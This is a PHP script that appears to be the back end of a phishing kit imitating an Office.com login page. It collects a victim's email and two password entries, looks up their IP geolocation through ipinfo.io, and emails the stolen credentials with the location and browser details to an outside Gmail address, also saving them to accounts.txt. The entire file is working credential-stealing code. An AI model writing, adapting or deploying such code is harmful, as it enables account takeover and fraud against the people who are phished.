<?php
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
    $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
    $ipaddress = 'unknown';
    return $ipaddress;
}
if (isset($_POST['email'])) {
	$des = $_POST['error'] == '1' ? "Yes" : "No";
	$value = "EMAIL: ".$_POST['email'];
	$value .= "\nPassword1: ".$_POST['passw'];
	$value .= "\nPassword2: ".$_POST['cpassw'];
	$value .= "\nDifferent Password? ".$des;
	$value .= "\n-------------------------------\n\n";
	// USER DETAILS
	$value .= "USER DETAILS\n";
	$ip = get_client_ip();
	$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
	$value .= "ip: " . $details->ip . "\n";
	$value .= "city: " . $details->city . "\n";
	$value .= "loc: " . $details->loc . "\n";
	$value .= "country: " . $details->country . "\n";
	$value .= "user_agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
	$sendTo = "fidelityinternationalinc2016@gmail.com";
	$subject = "MAIL from Office.com Schama Page";
	mail($sendTo, $subject, $value);
	$myfile=fopen("accounts.txt","a+");
	fwrite($myfile,$value);
	fclose($myfile);

}

?>
